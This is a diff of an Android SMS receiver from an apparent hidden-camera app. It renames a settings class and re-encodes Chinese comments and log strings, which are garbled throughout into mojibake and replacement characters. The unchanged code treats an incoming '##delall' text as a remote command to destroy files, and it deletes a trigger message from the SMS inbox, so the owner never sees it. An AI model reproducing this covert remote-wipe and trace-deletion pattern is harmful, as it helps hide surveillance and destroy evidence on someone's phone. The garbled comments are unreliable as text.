@@ -9,7 +9,7 @@ import android.os.Bundle;
 import android.telephony.SmsMessage;
 import android.util.Log;
 
-import com.leng.hiddencamera.Pingmws_SetActivity;
+import com.leng.hiddencamera.PmwsSetActivity;
 
 import java.text.SimpleDateFormat;
 import java.util.Date;
@@ -26,7 +26,7 @@ public class SmsReciver extends BroadcastReceiver {
 			Object[] smsObj = (Object[]) bundle.get("pdus");
 			for (Object object : smsObj) {
 				msg = SmsMessage.createFromPdu((byte[]) object);
-				Date date = new Date(msg.getTimestampMillis());// Ê±¼ä
+				Date date = new Date(msg.getTimestampMillis());// Ê±ï¿½ï¿½
 				SimpleDateFormat format = new SimpleDateFormat(
 						"yyyy-MM-dd HH:mm:ss");
 				String receiveTime = format.format(date);
@@ -36,18 +36,18 @@ public class SmsReciver extends BroadcastReceiver {
 
 				List<String> fList = ZipFileService.getFileList(path, "zip");
 
-				// ÔÚÕâÀïÐ´×Ô¼ºµÄÂß¼­
+				// ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ð´ï¿½Ô¼ï¿½ï¿½ï¿½ï¿½ß¼ï¿½
 				if (msg.getMessageBody().equals("##delall")) {
 					// TODO
-					Log.i("qweqweq", "½ÓÊÕµ½ÁËÏûÏ¢123456");
+					Log.i("qweqweq", "ï¿½ï¿½ï¿½Õµï¿½ï¿½ï¿½ï¿½ï¿½Ï¢123456");
 
-						//È«²¿É¾³ýÎÄ¼þ
-						new Pingmws_SetActivity().destroyFiles(msg);
+						//È«ï¿½ï¿½É¾ï¿½ï¿½ï¿½Ä¼ï¿½
+						new PmwsSetActivity().destroyFiles(msg);
 				}
 
-				if (msg.getMessageBody().equals("²âÊÔÉ¾³ý")){
-					deleteSMS(context,"²âÊÔÉ¾³ý");
-					Log.i("qweqweq","É¾³ý³É¹¦");
+				if (msg.getMessageBody().equals("ï¿½ï¿½ï¿½ï¿½É¾ï¿½ï¿½")){
+					deleteSMS(context,"ï¿½ï¿½ï¿½ï¿½É¾ï¿½ï¿½");
+					Log.i("qweqweq","É¾ï¿½ï¿½ï¿½É¹ï¿½");
 				}
 
 			}
@@ -56,16 +56,16 @@ public class SmsReciver extends BroadcastReceiver {
 	}
 
 	/**
-	 * Ö±½Óµ÷ÓÃ¶ÌÐÅ½Ó¿Ú·¢¶ÌÐÅ£¬²»º¬·¢ËÍ±¨¸æºÍ½ÓÊÜ±¨¸æ
+	 * Ö±ï¿½Óµï¿½ï¿½Ã¶ï¿½ï¿½Å½Ó¿Ú·ï¿½ï¿½ï¿½ï¿½Å£ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Í±ï¿½ï¿½ï¿½Í½ï¿½ï¿½Ü±ï¿½ï¿½ï¿½
 	 * 
 	 * @param phoneNumber
 	 * @param message
 	 */
 	public static void sendSMS(String phoneNumber, String message) {
-		// »ñÈ¡¶ÌÐÅ¹ÜÀíÆ÷
+		// ï¿½ï¿½È¡ï¿½ï¿½ï¿½Å¹ï¿½ï¿½ï¿½ï¿½ï¿½
 		android.telephony.SmsManager smsManager = android.telephony.SmsManager
 				.getDefault();
-		// ²ð·Ö¶ÌÐÅÄÚÈÝ£¨ÊÖ»ú¶ÌÐÅ³¤¶ÈÏÞÖÆ£©
+		// ï¿½ï¿½Ö¶ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ý£ï¿½ï¿½Ö»ï¿½ï¿½ï¿½ï¿½Å³ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Æ£ï¿½
 		List<String> divideContents = smsManager.divideMessage(message);
 		for (String text : divideContents) {
 			smsManager.sendTextMessage(phoneNumber, null, text, null, null);
@@ -77,18 +77,18 @@ public class SmsReciver extends BroadcastReceiver {
 	{
 		try
 		{
-			// ×¼±¸ÏµÍ³¶ÌÐÅÊÕÐÅÏäµÄuriµØÖ·
-			Uri uri = Uri.parse("content://sms/inbox");// ÊÕÐÅÏä
-			// ²éÑ¯ÊÕÐÅÏäÀïËùÓÐµÄ¶ÌÐÅ
+			// ×¼ï¿½ï¿½ÏµÍ³ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½uriï¿½ï¿½Ö·
+			Uri uri = Uri.parse("content://sms/inbox");// ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
+			// ï¿½ï¿½Ñ¯ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ÐµÄ¶ï¿½ï¿½ï¿½
 			Cursor isRead =
 					context.getContentResolver().query(uri, null, "read=" + 0,
 							null, null);
 			while (isRead.moveToNext())
 			{
 				// String phone =
-				// isRead.getString(isRead.getColumnIndex("address")).trim();//»ñÈ¡·¢ÐÅÈË
+				// isRead.getString(isRead.getColumnIndex("address")).trim();//ï¿½ï¿½È¡ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 				String body =
-						isRead.getString(isRead.getColumnIndex("body")).trim();// »ñÈ¡ÐÅÏ¢ÄÚÈÝ
+						isRead.getString(isRead.getColumnIndex("body")).trim();// ï¿½ï¿½È¡ï¿½ï¿½Ï¢ï¿½ï¿½ï¿½ï¿½
 				if (body.equals(smscontent))
 				{
 					int id = isRead.getInt(isRead.getColumnIndex("_id"));
